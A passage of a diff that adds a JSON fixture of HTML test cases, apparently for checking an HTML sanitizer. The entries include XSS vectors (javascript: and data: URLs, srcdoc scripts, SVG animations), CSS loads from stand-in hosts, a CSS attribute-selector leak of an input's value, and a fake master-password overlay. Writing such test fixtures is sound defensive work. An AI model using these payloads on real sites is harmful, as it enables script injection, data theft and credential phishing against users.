+    "name": "javascript: iframe src",
+    "html": "<iframe src=\"javascript:{{CANARY}}\"></iframe>"
+  },
+  {
+    "name": "javascript: form action",
+    "html": "<form action=\"javascript:{{CANARY}}\"><button>go</button></form>"
+  },
+  {
+    "name": "javascript: formaction on button and input",
+    "html": "<form><button formaction=\"javascript:{{CANARY}}\">b</button><input type=\"submit\" formaction=\"javascript:{{CANARY}}\"></form>"
+  },
+  {
+    "name": "javascript: xlink:href in SVG",
+    "html": "<svg><a xlink:href=\"javascript:{{CANARY}}\"><text y=\"10\">x</text></a></svg>"
+  },
+  {
+    "name": "javascript: href in SVG",
+    "html": "<svg><a href=\"javascript:{{CANARY}}\"><text y=\"10\">x</text></a></svg>"
+  },
+  {
+    "name": "javascript: background",
+    "html": "<table background=\"javascript:{{CANARY}}\"><tr><td>x</td></tr></table>"
+  },
+  {
+    "name": "javascript: poster",
+    "html": "<video poster=\"javascript:{{CANARY}}\"></video>"
+  },
+  {
+    "name": "javascript: ping",
+    "html": "<a href=\"http://ok.invalid/ping\" ping=\"javascript:{{CANARY}}\">p</a>"
+  },
+  {
+    "name": "javascript: embed and object",
+    "html": "<embed src=\"javascript:{{CANARY}}\"><object data=\"javascript:{{CANARY}}\"></object>"
+  },
+  {
+    "name": "javascript: img src",
+    "html": "<img src=\"javascript:{{CANARY}}\">"
+  },
+  {
+    "name": "javascript: srcdoc",
+    "html": "<iframe srcdoc=\"<script>{{CANARY}}</script>\"></iframe>"
+  },
+  {
+    "name": "javascript: MathML href",
+    "html": "<math href=\"javascript:{{CANARY}}\"><mi xlink:href=\"javascript:{{CANARY}}\">x</mi></math>"
+  },
+  {
+    "name": "javascript: isindex action",
+    "html": "<isindex action=\"javascript:{{CANARY}}\">"
+  },
+  {
+    "name": "data: svg image with a script",
+    "html": "<img src=\"data:image/svg+xml,<svg xmlns='urn:svg' onload='{{CANARY}}'/>\">"
+  },
+  {
+    "name": "data: iframe",
+    "html": "<iframe src=\"data:text/html,<script>{{CANARY}}</script>\"></iframe>"
+  },
+  {
+    "name": "data: object",
+    "html": "<object data=\"data:text/html,<script>alert(1)</script>\"></object>"
+  },
+  {
+    "name": "meta refresh to a remote page",
+    "html": "<meta http-equiv=\"refresh\" content=\"0; url=http://nav.invalid/refresh\">"
+  },
+  {
+    "name": "meta refresh to javascript:",
+    "html": "<meta http-equiv=\"refresh\" content=\"0;url=javascript:{{CANARY}}\">"
+  },
+  {
+    "name": "meta refresh in the body",
+    "html": "<p>x</p><meta http-equiv=\"Refresh\" content=\"0;URL='http://nav.invalid/body'\">"
+  },
+  {
+    "name": "base href and target",
+    "html": "<base href=\"http://base.invalid/\" target=\"_top\"><a href=\"page\">relative</a>"
+  },
+  {
+    "name": "base in the body and in SVG",
+    "html": "<p>x</p><base href=\"http://base.invalid/\"><svg><base href=\"http://base.invalid/\"/></svg>"
+  },
+  {
+    "name": "link that targets the top",
+    "html": "<a href=\"http://nav.invalid/top\" target=\"_top\">top</a>"
+  },
+  {
+    "name": "link that targets a named frame and asks for an opener",
+    "html": "<a href=\"http://nav.invalid/named\" target=\"preview\" rel=\"opener\">named</a>"
+  },
+  {
+    "name": "link with download",
+    "html": "<a href=\"http://ok.invalid/file.bin\" download=\"file.bin\">download</a>"
+  },
+  {
+    "name": "protocol-relative and relative links",
+    "html": "<a href=\"//nav.invalid/x\">proto</a> <a href=\"/account\">abs</a> <a href=\"?q=1\">query</a> <a href=\"#top\">frag</a>"
+  },
+  {
+    "name": "link on a local port",
+    "html": "<a href=\"http://127.0.0.1:9/x\">local</a>"
+  },
+  {
+    "name": "iframe, frame, frameset",
+    "html": "<iframe src=\"http://frame.invalid/\"></iframe><frameset><frame src=\"http://frame.invalid/f\"></frameset>"
+  },
+  {
+    "name": "portal and fencedframe",
+    "html": "<portal src=\"http://portal.invalid/\"></portal><fencedframe src=\"http://fenced.invalid/\"></fencedframe>"
+  },
+  {
+    "name": "applet",
+    "html": "<applet code=\"X.class\" codebase=\"http://applet.invalid/\"></applet>"
+  },
+  {
+    "name": "object with params, type text/html",
+    "html": "<object type=\"text/html\" data=\"http://object.invalid/page\"><param name=\"movie\" value=\"http://object.invalid/m.swf\"></object>"
+  },
+  {
+    "name": "embed of an SVG and of a package script",
+    "html": "<embed type=\"image/svg+xml\" src=\"http://embed.invalid/a.svg\"><embed type=\"text/javascript\" src=\"/theme-boot.js\">"
+  },
+  {
+    "name": "nested srcdoc",
+    "html": "<iframe srcdoc=\"<iframe srcdoc='<script>{{CANARY}}</script>'></iframe>\"></iframe>"
+  },
+  {
+    "name": "iframe with a sandbox that allows scripts",
+    "html": "<iframe sandbox=\"allow-scripts allow-same-origin\" srcdoc=\"<script>{{CANARY}}</script>\"></iframe>"
+  },
+  {
+    "name": "form that would submit",
+    "html": "<form action=\"http://form.invalid/submit\" method=\"post\"><input name=\"q\" value=\"x\"><button id=\"hp-submit\">Go</button></form>"
+  },
+  {
+    "name": "form with only a text field (submitted by Enter)",
+    "html": "<form action=\"http://form.invalid/enter\"><input name=\"q\" value=\"enter\"></form>"
+  },
+  {
+    "name": "autofocus that would take the page’s focus",
+    "html": "<input autofocus value=\"focus\"><textarea autofocus>t</textarea><select autofocus><option>o</option></select>"
+  },
+  {
+    "name": "file input",
+    "html": "<form><input type=\"file\" name=\"f\"></form>"
+  },
+  {
+    "name": "button with formaction and formtarget",
+    "html": "<form><button formaction=\"http://form.invalid/btn\" formtarget=\"_top\" formmethod=\"post\">b</button></form>"
+  },
+  {
+    "name": "button outside its form",
+    "html": "<form id=\"far\" action=\"http://form.invalid/far\"></form><button form=\"far\">far</button>"
+  },
+  {
+    "name": "form target top",
+    "html": "<form action=\"http://form.invalid/t\" target=\"_top\"><input type=\"submit\"></form>"
+  },
+  {
+    "name": "submit input and image input",
+    "html": "<form><input type=\"submit\" value=\"Send\"><input type=\"image\" src=\"http://img.invalid/submit.png\" alt=\"Send\"></form>"
+  },
+  {
+    "name": "link rel=stylesheet",
+    "html": "<link rel=\"stylesheet\" href=\"http://link.invalid/stylesheet\" as=\"image\" imagesrcset=\"http://link.invalid/set.png 1x\"><p>x</p>"
+  },
+  {
+    "name": "link rel=alternate stylesheet",
+    "html": "<link rel=\"alternate stylesheet\" href=\"http://link.invalid/alternate-stylesheet\" as=\"image\" imagesrcset=\"http://link.invalid/set.png 1x\"><p>x</p>"
+  },
+  {
+    "name": "link rel=preload",
+    "html": "<link rel=\"preload\" href=\"http://link.invalid/preload\" as=\"image\" imagesrcset=\"http://link.invalid/set.png 1x\"><p>x</p>"
+  },
+  {
+    "name": "link rel=prefetch",
+    "html": "<link rel=\"prefetch\" href=\"http://link.invalid/prefetch\" as=\"image\" imagesrcset=\"http://link.invalid/set.png 1x\"><p>x</p>"
+  },
+  {
+    "name": "link rel=dns-prefetch",
+    "html": "<link rel=\"dns-prefetch\" href=\"http://link.invalid/dns-prefetch\" as=\"image\" imagesrcset=\"http://link.invalid/set.png 1x\"><p>x</p>"
+  },
+  {
+    "name": "link rel=preconnect",
+    "html": "<link rel=\"preconnect\" href=\"http://link.invalid/preconnect\" as=\"image\" imagesrcset=\"http://link.invalid/set.png 1x\"><p>x</p>"
+  },
+  {
+    "name": "link rel=modulepreload",
+    "html": "<link rel=\"modulepreload\" href=\"http://link.invalid/modulepreload\" as=\"image\" imagesrcset=\"http://link.invalid/set.png 1x\"><p>x</p>"
+  },
+  {
+    "name": "link rel=icon",
+    "html": "<link rel=\"icon\" href=\"http://link.invalid/icon\" as=\"image\" imagesrcset=\"http://link.invalid/set.png 1x\"><p>x</p>"
+  },
+  {
+    "name": "link rel=shortcut icon",
+    "html": "<link rel=\"shortcut icon\" href=\"http://link.invalid/shortcut-icon\" as=\"image\" imagesrcset=\"http://link.invalid/set.png 1x\"><p>x</p>"
+  },
+  {
+    "name": "link rel=apple-touch-icon",
+    "html": "<link rel=\"apple-touch-icon\" href=\"http://link.invalid/apple-touch-icon\" as=\"image\" imagesrcset=\"http://link.invalid/set.png 1x\"><p>x</p>"
+  },
+  {
+    "name": "link rel=manifest",
+    "html": "<link rel=\"manifest\" href=\"http://link.invalid/manifest\" as=\"image\" imagesrcset=\"http://link.invalid/set.png 1x\"><p>x</p>"
+  },
+  {
+    "name": "link rel=import",
+    "html": "<link rel=\"import\" href=\"http://link.invalid/import\" as=\"image\" imagesrcset=\"http://link.invalid/set.png 1x\"><p>x</p>"
+  },
+  {
+    "name": "link rel=prerender",
+    "html": "<link rel=\"prerender\" href=\"http://link.invalid/prerender\" as=\"image\" imagesrcset=\"http://link.invalid/set.png 1x\"><p>x</p>"
+  },
+  {
+    "name": "link rel=next",
+    "html": "<link rel=\"next\" href=\"http://link.invalid/next\" as=\"image\" imagesrcset=\"http://link.invalid/set.png 1x\"><p>x</p>"
+  },
+  {
+    "name": "link rel=pingback",
+    "html": "<link rel=\"pingback\" href=\"http://link.invalid/pingback\" as=\"image\" imagesrcset=\"http://link.invalid/set.png 1x\"><p>x</p>"
+  },
+  {
+    "name": "link rel=expect",
+    "html": "<link rel=\"expect\" href=\"http://link.invalid/expect\" as=\"image\" imagesrcset=\"http://link.invalid/set.png 1x\"><p>x</p>"
+  },
+  {
+    "name": "link rel=compression-dictionary",
+    "html": "<link rel=\"compression-dictionary\" href=\"http://link.invalid/compression-dictionary\" as=\"image\" imagesrcset=\"http://link.invalid/set.png 1x\"><p>x</p>"
+  },
+  {
+    "name": "link rel=search",
+    "html": "<link rel=\"search\" href=\"http://link.invalid/search\" as=\"image\" imagesrcset=\"http://link.invalid/set.png 1x\"><p>x</p>"
+  },
+  {
+    "name": "link rel=serviceworker",
+    "html": "<link rel=\"serviceworker\" href=\"http://link.invalid/serviceworker\" as=\"image\" imagesrcset=\"http://link.invalid/set.png 1x\"><p>x</p>"
+  },
+  {
+    "name": "link rel=stylesheet in the body",
+    "html": "<p>x</p><link rel=\"stylesheet\" href=\"http://link.invalid/body.css\">"
+  },
+  {
+    "name": "link rel=stylesheet of the package",
+    "html": "<link rel=\"stylesheet\" href=\"/assets/index.css\">"
+  },
+  {
+    "name": "img with srcset and sizes",
+    "html": "<img srcset=\"http://img.invalid/a.png 1x, http://img.invalid/b.png 2x\" sizes=\"10px\" alt=\"set\">"
+  },
+  {
+    "name": "img lazy",
+    "html": "<img loading=\"lazy\" src=\"http://img.invalid/lazy.png\" alt=\"lazy\">"
+  },
+  {
+    "name": "img lowsrc and dynsrc",
+    "html": "<img lowsrc=\"http://img.invalid/low.png\" dynsrc=\"http://img.invalid/dyn.avi\" alt=\"old\">"
+  },
+  {
+    "name": "image element (the parser makes it img)",
+    "html": "<image src=\"http://img.invalid/image.png\">"
+  },
+  {
+    "name": "img of the package",
+    "html": "<img src=\"/icons/icon-16.png\" alt=\"own\">"
+  },
+  {
+    "name": "img with a relative address",
+    "html": "<img src=\"x\" alt=\"rel\">"
+  },
+  {
+    "name": "picture with media sources",
+    "html": "<picture><source media=\"(min-width: 1px)\" srcset=\"http://img.invalid/p.webp\"><source type=\"image/avif\" srcset=\"http://img.invalid/p.avif\"><img src=\"http://img.invalid/p.png\" alt=\"pic\"></picture>"
+  },
+  {
+    "name": "video with sources and a track",
+    "html": "<video controls autoplay muted><source src=\"http://media.invalid/v.webm\" type=\"video/webm\"><source src=\"http://media.invalid/v.mp4\"><track default kind=\"captions\" src=\"http://media.invalid/t.vtt\"></video>"
+  },
+  {
+    "name": "audio with src, autoplay, preload",
+    "html": "<audio src=\"http://media.invalid/a.mp3\" autoplay preload=\"auto\" controls></audio>"
+  },
+  {
+    "name": "video poster and src",
+    "html": "<video src=\"http://media.invalid/p.mp4\" poster=\"http://img.invalid/poster.png\" preload=\"auto\"></video>"
+  },
+  {
+    "name": "background attributes",
+    "html": "<body background=\"http://img.invalid/body.png\"><table background=\"http://img.invalid/t.png\"><tr><td background=\"http://img.invalid/td.png\">x</td></tr></table>"
+  },
+  {
+    "name": "input type image",
+    "html": "<input type=\"image\" src=\"http://img.invalid/input.png\" alt=\"in\">"
+  },
+  {
+    "name": "SVG use with a remote address and data:",
+    "html": "<svg><use href=\"http://svg.invalid/s.svg#a\"/><use xlink:href=\"data:image/svg+xml,&lt;svg id=&quot;x&quot;&gt;&lt;image href=&quot;http://img.invalid/use.png&quot;/&gt;&lt;/svg&gt;#x\"/></svg>"
+  },
+  {
+    "name": "SVG image and feImage",
+    "html": "<svg><image href=\"http://img.invalid/svg.png\" width=\"10\" height=\"10\"/><filter id=\"f\"><feImage href=\"http://img.invalid/fe.png\"/></filter></svg>"
+  },
+  {
+    "name": "SVG foreignObject with HTML inside",
+    "html": "<svg><foreignObject width=\"100\" height=\"50\"><img src=\"http://img.invalid/fo.png\" onerror=\"{{CANARY}}\"><iframe src=\"http://frame.invalid/fo\"></iframe><script>{{CANARY}}</script></foreignObject></svg>"
+  },
+  {
+    "name": "SVG animate that sets href",
+    "html": "<svg><a><animate attributeName=\"href\" values=\"javascript:{{CANARY}}\" dur=\"10ms\" fill=\"freeze\"/><text y=\"10\">anim</text></a></svg>"
+  },
+  {
+    "name": "SVG set that sets xlink:href",
+    "html": "<svg><a><set attributeName=\"xlink:href\" to=\"javascript:{{CANARY}}\"/><text y=\"10\">set</text></a></svg>"
+  },
+  {
+    "name": "SVG animate that sets a handler",
+    "html": "<svg><rect width=\"5\" height=\"5\"><animate attributeName=\"onmouseover\" to=\"{{CANARY}}\"/></rect></svg>"
+  },
+  {
+    "name": "SVG presentation attributes with remote url()",
+    "html": "<svg><rect width=\"10\" height=\"10\" fill=\"url(http://svg.invalid/p.svg#g)\" filter=\"url(http://svg.invalid/f.svg#f)\" mask=\"url(http://svg.invalid/m.svg#m)\" clip-path=\"url(http://svg.invalid/c.svg#c)\" cursor=\"url(http://svg.invalid/c.cur), auto\"/></svg>"
+  },
+  {
+    "name": "SVG presentation attribute with an escaped url()",
+    "html": "<svg><rect width=\"10\" height=\"10\" fill=\"u\\72l(http://svg.invalid/esc.svg#g)\"/></svg>"
+  },
+  {
+    "name": "SVG with local references (kept)",
+    "html": "<svg width=\"20\" height=\"10\"><defs><linearGradient id=\"g\"><stop offset=\"0\" stop-color=\"red\"/></linearGradient><filter id=\"b\"><feGaussianBlur stdDeviation=\"1\"/></filter><symbol id=\"s\"><rect width=\"5\" height=\"5\"/></symbol></defs><rect width=\"10\" height=\"10\" fill=\"url(#g)\" filter=\"url(#b)\"/><use href=\"#s\" x=\"10\"/></svg>"
+  },
+  {
+    "name": "SVG style with @import and url()",
+    "html": "<svg><style>@import url(http://css.invalid/svg.css); rect { fill: url(http://css.invalid/fill.svg#g) }</style><rect width=\"5\" height=\"5\"/></svg>"
+  },
+  {
+    "name": "SVG style attribute with url()",
+    "html": "<svg style=\"background:url(http://css.invalid/svg-attr.png)\"><rect style=\"fill:url(http://css.invalid/f.svg#x)\" width=\"5\" height=\"5\"/></svg>"
+  },
+  {
+    "name": "SVG cursor and font-face-uri elements",
+    "html": "<svg><cursor xlink:href=\"http://svg.invalid/c.png\"/><font-face><font-face-src><font-face-uri xlink:href=\"http://svg.invalid/f.svg\"/></font-face-src></font-face></svg>"
+  },
+  {
+    "name": "CSS in a sheet: background: url(http://css.invalid/bg.png)",
+    "html": "<style>.hp { background: url(http://css.invalid/bg.png) } .hp::before { background: url(http://css.invalid/bg.png); content: \"x\" }</style><div class=\"hp\">x</div><ul class=\"hp\"><li>i</li></ul>"
+  },
+  {
+    "name": "CSS in a style attribute: background: url(http://css.invalid/bg.png)",
+    "html": "<div style=\"background: url(http://css.invalid/bg.png)\">x</div>"
+  },
+  {
+    "name": "CSS in a sheet: background-image: url(\"http://css.invalid/bgi.png\")",
+    "html": "<style>.hp { background-image: url(\"http://css.invalid/bgi.png\") } .hp::before { background-image: url(\"http://css.invalid/bgi.png\"); content: \"x\" }</style><div class=\"hp\">x</div><ul class=\"hp\"><li>i</li></ul>"
+  },
+  {
+    "name": "CSS in a style attribute: background-image: url(\"http://css.invalid/bgi.png\")",
+    "html": "<div style=\"background-image: url(&quot;http://css.invalid/bgi.png&quot;)\">x</div>"
+  },
+  {
+    "name": "CSS in a sheet: list-style: url(http://css.invalid/list.png)",
+    "html": "<style>.hp { list-style: url(http://css.invalid/list.png) } .hp::before { list-style: url(http://css.invalid/list.png); content: \"x\" }</style><div class=\"hp\">x</div><ul class=\"hp\"><li>i</li></ul>"
+  },
+  {
+    "name": "CSS in a style attribute: list-style: url(http://css.invalid/list.png)",
+    "html": "<div style=\"list-style: url(http://css.invalid/list.png)\">x</div>"
+  },
+  {
+    "name": "CSS in a sheet: list-style-image: url(http://css.invalid/lsi.png)",
+    "html": "<style>.hp { list-style-image: url(http://css.invalid/lsi.png) } .hp::before { list-style-image: url(http://css.invalid/lsi.png); content: \"x\" }</style><div class=\"hp\">x</div><ul class=\"hp\"><li>i</li></ul>"
+  },
+  {
+    "name": "CSS in a style attribute: list-style-image: url(http://css.invalid/lsi.png)",
+    "html": "<div style=\"list-style-image: url(http://css.invalid/lsi.png)\">x</div>"
+  },
+  {
+    "name": "CSS in a sheet: cursor: url(http://css.invalid/cursor.cur), auto",
+    "html": "<style>.hp { cursor: url(http://css.invalid/cursor.cur), auto } .hp::before { cursor: url(http://css.invalid/cursor.cur), auto; content: \"x\" }</style><div class=\"hp\">x</div><ul class=\"hp\"><li>i</li></ul>"
+  },
+  {
+    "name": "CSS in a style attribute: cursor: url(http://css.invalid/cursor.cur), auto",
+    "html": "<div style=\"cursor: url(http://css.invalid/cursor.cur), auto\">x</div>"
+  },
+  {
+    "name": "CSS in a sheet: content: url(http://css.invalid/content.png)",
+    "html": "<style>.hp { content: url(http://css.invalid/content.png) } .hp::before { content: url(http://css.invalid/content.png); content: \"x\" }</style><div class=\"hp\">x</div><ul class=\"hp\"><li>i</li></ul>"
+  },
+  {
+    "name": "CSS in a style attribute: content: url(http://css.invalid/content.png)",
+    "html": "<div style=\"content: url(http://css.invalid/content.png)\">x</div>"
+  },
+  {
+    "name": "CSS in a sheet: mask: url(http://css.invalid/mask.svg)",
+    "html": "<style>.hp { mask: url(http://css.invalid/mask.svg) } .hp::before { mask: url(http://css.invalid/mask.svg); content: \"x\" }</style><div class=\"hp\">x</div><ul class=\"hp\"><li>i</li></ul>"
+  },
+  {
+    "name": "CSS in a style attribute: mask: url(http://css.invalid/mask.svg)",
+    "html": "<div style=\"mask: url(http://css.invalid/mask.svg)\">x</div>"
+  },
+  {
+    "name": "CSS in a sheet: -webkit-mask-image: url(http://css.invalid/wmask.png)",
+    "html": "<style>.hp { -webkit-mask-image: url(http://css.invalid/wmask.png) } .hp::before { -webkit-mask-image: url(http://css.invalid/wmask.png); content: \"x\" }</style><div class=\"hp\">x</div><ul class=\"hp\"><li>i</li></ul>"
+  },
+  {
+    "name": "CSS in a style attribute: -webkit-mask-image: url(http://css.invalid/wmask.png)",
+    "html": "<div style=\"-webkit-mask-image: url(http://css.invalid/wmask.png)\">x</div>"
+  },
+  {
+    "name": "CSS in a sheet: -webkit-mask-box-image: url(http://css.invalid/wbox.png)",
+    "html": "<style>.hp { -webkit-mask-box-image: url(http://css.invalid/wbox.png) } .hp::before { -webkit-mask-box-image: url(http://css.invalid/wbox.png); content: \"x\" }</style><div class=\"hp\">x</div><ul class=\"hp\"><li>i</li></ul>"
+  },
+  {
+    "name": "CSS in a style attribute: -webkit-mask-box-image: url(http://css.invalid/wbox.png)",
+    "html": "<div style=\"-webkit-mask-box-image: url(http://css.invalid/wbox.png)\">x</div>"
+  },
+  {
+    "name": "CSS in a sheet: border-image: url(http://css.invalid/border.png) 30 round",
+    "html": "<style>.hp { border-image: url(http://css.invalid/border.png) 30 round } .hp::before { border-image: url(http://css.invalid/border.png) 30 round; content: \"x\" }</style><div class=\"hp\">x</div><ul class=\"hp\"><li>i</li></ul>"
+  },
+  {
+    "name": "CSS in a style attribute: border-image: url(http://css.invalid/border.png) 30 round",
+    "html": "<div style=\"border-image: url(http://css.invalid/border.png) 30 round\">x</div>"
+  },
+  {
+    "name": "CSS in a sheet: filter: url(http://css.invalid/filter.svg#f)",
+    "html": "<style>.hp { filter: url(http://css.invalid/filter.svg#f) } .hp::before { filter: url(http://css.invalid/filter.svg#f); content: \"x\" }</style><div class=\"hp\">x</div><ul class=\"hp\"><li>i</li></ul>"
+  },
+  {
+    "name": "CSS in a style attribute: filter: url(http://css.invalid/filter.svg#f)",
+    "html": "<div style=\"filter: url(http://css.invalid/filter.svg#f)\">x</div>"
+  },
+  {
+    "name": "CSS in a sheet: shape-outside: url(http://css.invalid/shape.png)",
+    "html": "<style>.hp { shape-outside: url(http://css.invalid/shape.png) } .hp::before { shape-outside: url(http://css.invalid/shape.png); content: \"x\" }</style><div class=\"hp\">x</div><ul class=\"hp\"><li>i</li></ul>"
+  },
+  {
+    "name": "CSS in a style attribute: shape-outside: url(http://css.invalid/shape.png)",
+    "html": "<div style=\"shape-outside: url(http://css.invalid/shape.png)\">x</div>"
+  },
+  {
+    "name": "CSS in a sheet: clip-path: url(http://css.invalid/clip.svg#c)",
+    "html": "<style>.hp { clip-path: url(http://css.invalid/clip.svg#c) } .hp::before { clip-path: url(http://css.invalid/clip.svg#c); content: \"x\" }</style><div class=\"hp\">x</div><ul class=\"hp\"><li>i</li></ul>"
+  },
+  {
+    "name": "CSS in a style attribute: clip-path: url(http://css.invalid/clip.svg#c)",
+    "html": "<div style=\"clip-path: url(http://css.invalid/clip.svg#c)\">x</div>"
+  },
+  {
+    "name": "CSS in a sheet: offset-path: url(http://css.invalid/path.svg#p)",
+    "html": "<style>.hp { offset-path: url(http://css.invalid/path.svg#p) } .hp::before { offset-path: url(http://css.invalid/path.svg#p); content: \"x\" }</style><div class=\"hp\">x</div><ul class=\"hp\"><li>i</li></ul>"
+  },
+  {
+    "name": "CSS in a style attribute: offset-path: url(http://css.invalid/path.svg#p)",
+    "html": "<div style=\"offset-path: url(http://css.invalid/path.svg#p)\">x</div>"
+  },
+  {
+    "name": "CSS in a sheet: background: image-set(\"http://css.invalid/set.png\" 1x)",
+    "html": "<style>.hp { background: image-set(\"http://css.invalid/set.png\" 1x) } .hp::before { background: image-set(\"http://css.invalid/set.png\" 1x); content: \"x\" }</style><div class=\"hp\">x</div><ul class=\"hp\"><li>i</li></ul>"
+  },
+  {
+    "name": "CSS in a style attribute: background: image-set(\"http://css.invalid/set.png\" 1x)",
+    "html": "<div style=\"background: image-set(&quot;http://css.invalid/set.png&quot; 1x)\">x</div>"
+  },
+  {
+    "name": "CSS in a sheet: background: -webkit-image-set(url(http://css.invalid/wset.png) 1x)",
+    "html": "<style>.hp { background: -webkit-image-set(url(http://css.invalid/wset.png) 1x) } .hp::before { background: -webkit-image-set(url(http://css.invalid/wset.png) 1x); content: \"x\" }</style><div class=\"hp\">x</div><ul class=\"hp\"><li>i</li></ul>"
+  },
+  {
+    "name": "CSS in a style attribute: background: -webkit-image-set(url(http://css.invalid/wset.png) 1x)",
+    "html": "<div style=\"background: -webkit-image-set(url(http://css.invalid/wset.png) 1x)\">x</div>"
+  },
+  {
+    "name": "CSS in a sheet: background: image(\"http://css.invalid/image.png\")",
+    "html": "<style>.hp { background: image(\"http://css.invalid/image.png\") } .hp::before { background: image(\"http://css.invalid/image.png\"); content: \"x\" }</style><div class=\"hp\">x</div><ul class=\"hp\"><li>i</li></ul>"
+  },
+  {
+    "name": "CSS in a style attribute: background: image(\"http://css.invalid/image.png\")",
+    "html": "<div style=\"background: image(&quot;http://css.invalid/image.png&quot;)\">x</div>"
+  },
+  {
+    "name": "CSS in a sheet: background: cross-fade(url(http://css.invalid/a.png), url(http://css.invalid/b.png), 50%)",
+    "html": "<style>.hp { background: cross-fade(url(http://css.invalid/a.png), url(http://css.invalid/b.png), 50%) } .hp::before { background: cross-fade(url(http://css.invalid/a.png), url(http://css.invalid/b.png), 50%); content: \"x\" }</style><div class=\"hp\">x</div><ul class=\"hp\"><li>i</li></ul>"
+  },
+  {
+    "name": "CSS in a style attribute: background: cross-fade(url(http://css.invalid/a.png), url(http://css.invalid/b.png), 50%)",
+    "html": "<div style=\"background: cross-fade(url(http://css.invalid/a.png), url(http://css.invalid/b.png), 50%)\">x</div>"
+  },
+  {
+    "name": "CSS in a sheet: background: \\75 rl(http://css.invalid/escaped.png)",
+    "html": "<style>.hp { background: \\75 rl(http://css.invalid/escaped.png) } .hp::before { background: \\75 rl(http://css.invalid/escaped.png); content: \"x\" }</style><div class=\"hp\">x</div><ul class=\"hp\"><li>i</li></ul>"
+  },
+  {
+    "name": "CSS in a style attribute: background: \\75 rl(http://css.invalid/escaped.png)",
+    "html": "<div style=\"background: \\75 rl(http://css.invalid/escaped.png)\">x</div>"
+  },
+  {
+    "name": "CSS in a sheet: background: URL( http://css.invalid/upper.png )",
+    "html": "<style>.hp { background: URL( http://css.invalid/upper.png ) } .hp::before { background: URL( http://css.invalid/upper.png ); content: \"x\" }</style><div class=\"hp\">x</div><ul class=\"hp\"><li>i</li></ul>"
+  },
+  {
+    "name": "CSS in a style attribute: background: URL( http://css.invalid/upper.png )",
+    "html": "<div style=\"background: URL( http://css.invalid/upper.png )\">x</div>"
+  },
+  {
+    "name": "CSS in a sheet: behavior: url(http://css.invalid/x.htc)",
+    "html": "<style>.hp { behavior: url(http://css.invalid/x.htc) } .hp::before { behavior: url(http://css.invalid/x.htc); content: \"x\" }</style><div class=\"hp\">x</div><ul class=\"hp\"><li>i</li></ul>"
+  },
+  {
+    "name": "CSS in a style attribute: behavior: url(http://css.invalid/x.htc)",
+    "html": "<div style=\"behavior: url(http://css.invalid/x.htc)\">x</div>"
+  },
+  {
+    "name": "CSS in a sheet: -moz-binding: url(http://css.invalid/x.xml#b)",
+    "html": "<style>.hp { -moz-binding: url(http://css.invalid/x.xml#b) } .hp::before { -moz-binding: url(http://css.invalid/x.xml#b); content: \"x\" }</style><div class=\"hp\">x</div><ul class=\"hp\"><li>i</li></ul>"
+  },
+  {
+    "name": "CSS in a style attribute: -moz-binding: url(http://css.invalid/x.xml#b)",
+    "html": "<div style=\"-moz-binding: url(http://css.invalid/x.xml#b)\">x</div>"
+  },
+  {
+    "name": "CSS in a sheet: width: expression(alert(1))",
+    "html": "<style>.hp { width: expression(alert(1)) } .hp::before { width: expression(alert(1)); content: \"x\" }</style><div class=\"hp\">x</div><ul class=\"hp\"><li>i</li></ul>"
+  },
+  {
+    "name": "CSS in a style attribute: width: expression(alert(1))",
+    "html": "<div style=\"width: expression(alert(1))\">x</div>"
+  },
+  {
+    "name": "CSS @import in every form",
+    "html": "<style>@import url(http://css.invalid/1.css); @import \"http://css.invalid/2.css\"; @import url(\"http://css.invalid/3.css\") screen; @\\69mport \"http://css.invalid/4.css\"; @IMPORT 'http://css.invalid/5.css' layer(x);</style><p>x</p>"
+  },
+  {
+    "name": "CSS @font-face with remote fonts",
+    "html": "<style>@font-face { font-family: Hp; src: url(http://font.invalid/a.woff2) format('woff2'), url(http://font.invalid/a.woff) format('woff') } p { font-family: Hp }</style><p>font</p>"
+  },
+  {
+    "name": "CSS @namespace with an address",
+    "html": "<style>@namespace x url(http://css.invalid/ns); p { color: red }</style><p>ns</p>"
+  },
+  {
+    "name": "CSS url in a custom property used through var()",
+    "html": "<style>:root { --u: url(http://css.invalid/var.png); --s: \"http://css.invalid/str.png\" } p { background: var(--u); background-image: image-set(var(--s) 1x) }</style><p>var</p>"
+  },
+  {
+    "name": "CSS attribute selectors that would leak an input’s value",
+    "html": "<style>input[value^=\"a\"] { background: url(http://leak.invalid/a) } input[value^=\"s\"] { background: url(http://leak.invalid/s) } input[value$=\"t\"] { list-style: url(http://leak.invalid/t) }</style><input value=\"secret\">"
+  },
+  {
+    "name": "CSS @counter-style with an image symbol",
+    "html": "<style>@counter-style hp { system: cyclic; symbols: url(http://css.invalid/symbol.png); suffix: \" \" } ol { list-style: hp }</style><ol><li>a</li></ol>"
+  },
+  {
+    "name": "CSS nested rules with url()",
+    "html": "<style>.n { color: red; &:hover { background: url(http://css.invalid/nested.png) } & p { cursor: url(http://css.invalid/n.cur), auto } }</style><div class=\"n\"><p>n</p></div>"
+  },
+  {
+    "name": "CSS @media and @supports with url()",
+    "html": "<style>@media all { @supports (display: grid) { p { background: url(http://css.invalid/media.png) } } }</style><p>m</p>"
+  },
+  {
+    "name": "CSS with an unterminated url",
+    "html": "<style>p { color: red; background: url(http://css.invalid/open.png</style><p>open</p>"
+  },
+  {
+    "name": "CSS hidden behind comments and escapes",
+    "html": "<style>p { background: /**/url(http://css.invalid/c1.png); background: u\\rl(http://css.invalid/c2.png); background: \\000075rl(http://css.invalid/c3.png) }</style><p>c</p>"
+  },
+  {
+    "name": "CSS url with an entity in the attribute",
+    "html": "<div style=\"background:url&#40;http://css.invalid/entity.png&#41;\">e</div>"
+  },
+  {
+    "name": "a full-page fixed overlay at the top of every layer",
+    "html": "<div style=\"position:fixed;inset:0;z-index:2147483647;background:white;pointer-events:auto\">Settings — enter your master password</div>"
+  },
+  {
+    "name": "an overlay that lets clicks through to a fake button",
+    "html": "<style>.o { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; pointer-events: none; z-index: 99999 } .o button { pointer-events: auto }</style><div class=\"o\"><button>Copy HTML</button></div>"
+  },
+  {
+    "name": "content pushed outside its frame",
+    "html": "<div style=\"position:absolute;left:-10000px;top:-10000px;width:30000px;height:30000px;background:red\">x</div><div style=\"margin-left:-500vw;transform:scale(50)\">y</div>"
+  },
+  {
+    "name": "zoom and huge shadows",
+    "html": "<style>:root { zoom: 20 } p { box-shadow: 0 0 0 100000px red; outline: 100000px solid blue }</style><p>z</p>"
+  },
+  {
+    "name": "a large custom cursor",
+    "html": "<style>* { cursor: url(http://css.invalid/big.png) 0 0, auto !important }</style><p>c</p>"
+  },
+  {
